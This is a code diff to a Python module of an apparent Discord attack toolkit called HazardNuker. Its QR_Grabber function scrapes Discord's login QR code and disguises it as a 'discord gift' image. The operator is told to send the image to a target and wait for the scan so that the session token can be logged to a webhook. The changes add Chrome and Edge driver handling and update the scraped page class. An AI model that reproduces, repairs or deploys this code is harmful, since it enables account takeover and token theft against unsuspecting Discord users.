@@ -7,8 +7,10 @@
 
 import requests
 import os
+import sys
 import json
 import base64
+import Hazard
 
 from PIL import Image
 from zipfile import ZipFile
@@ -18,13 +20,12 @@ from selenium import webdriver
 from bs4 import BeautifulSoup
 from colorama import Fore
 
-from util.plugins.common import Chrome_Installer, getheaders
+from util.plugins.common import get_driver, getheaders
 
 def logo_qr():
     #Paste the discord logo onto the QR code
     im1 = Image.open('QR-Code/temp_qr_code.png', 'r')
     im2 = Image.open('QR-Code/overlay.png', 'r')
-    im2_w, im2_h = im2.size
     im1.paste(im2, (60, 55), im2)
     im1.save('QR-Code/Qr_Code.png', quality=95)
 
@@ -36,21 +37,29 @@ def paste_template():
     im1.save('QR-Code/discord_gift.png', quality=95)
 
 def QR_Grabber(Webhook):
-    print(f"\n{Fore.GREEN}Checking Chromedriver. . .")
-    sleep(0.5)
-    #Checking if chromedriver already exists
-    if os.path.exists(os.getcwd()+"\\chromedriver.exe"): 
-        print(f"Chromedriver already exists, continuing. . .{Fore.RESET}")
-        sleep(0.5)
-    else:
-        #installing chromdriver
-        print(f"{Fore.RED}Chromedriver not found! Installing it for you")
-        Chrome_Installer()
+    type_ = get_driver()
 
-    options = webdriver.ChromeOptions()
-    options.add_experimental_option('excludeSwitches', ['enable-logging']) #disable logging
-    options.add_experimental_option('detach', True)
-    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
+    if type_ == "chromedriver.exe":
+        opts = webdriver.ChromeOptions()
+        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        opts.add_experimental_option("detach", True)
+        driver = webdriver.Chrome(options=opts)
+    # elif type_ == "operadriver.exe":
+    #     opts = webdriver.opera.options.ChromeOptions()
+    #     opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+    #     opts.add_experimental_option("detach", True)
+    #     driver = webdriver.Opera(options=opts)
+    elif type_ == "msedgedriver.exe":
+        opts = webdriver.EdgeOptions()
+        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
+        opts.add_experimental_option("detach", True)
+        driver = webdriver.Edge(options=opts)
+    else:
+        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Coudln\'t find a driver to create a QR code with')
+        sleep(3)
+        print("Enter anything to continue. . . ", end="")
+        input()
+        Hazard.main()
 
     driver.get('https://discord.com/login') #get discord url so we can log the token
     sleep(3)
@@ -59,7 +68,7 @@ def QR_Grabber(Webhook):
     soup = BeautifulSoup(page_source, features='html.parser')
 
     #Create the QR code
-    div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
+    div = soup.find('div', {'class': 'qrCode-2R7t9S'})
     qr_code = div.find('img')['src']
     file = os.path.join(os.getcwd(), 'QR-Code/temp_qr_code.png')
 
@@ -93,11 +102,11 @@ def QR_Grabber(Webhook):
     print(f'{Fore.MAGENTA}Send the QR Code to a user and wait for them to scan!{Fore.RESET}')
     os.system(f'start {os.path.realpath(os.getcwd()+"/QR-Code")}')
     print(f'\nOpening a new HazardNuker so you can keep using it while this one logs the qr code!\nFeel free to minimize this window{Fore.RESET}')
-    try:
-        os.startfile("HazardNuker.exe")
-    except:
-        print(f"Failed to open HazardNuker, did you rename it or moved it somewhere else?")
-        pass
+    if sys.argv[0].endswith(".exe"):
+        try:
+            os.startfile(sys.argv[0])
+        except Exception:
+            pass
 
     #Waiting for them to scan QR code
     while True:
